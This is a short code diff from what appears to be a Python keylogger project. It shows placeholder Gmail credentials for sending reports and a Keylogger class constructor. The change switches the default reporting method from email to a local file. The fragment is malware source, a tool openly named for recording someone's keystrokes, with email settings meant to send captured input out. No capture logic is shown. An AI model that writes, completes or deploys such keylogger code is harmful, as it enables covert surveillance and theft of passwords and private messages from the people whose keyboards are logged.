@@ -9,7 +9,7 @@ EMAIL_ADDRESS = "thisisafakegmail@gmail.com"
 EMAIL_PASSWORD = "thisisafakepassword"
 
 class Keylogger:
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="file"):
         # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
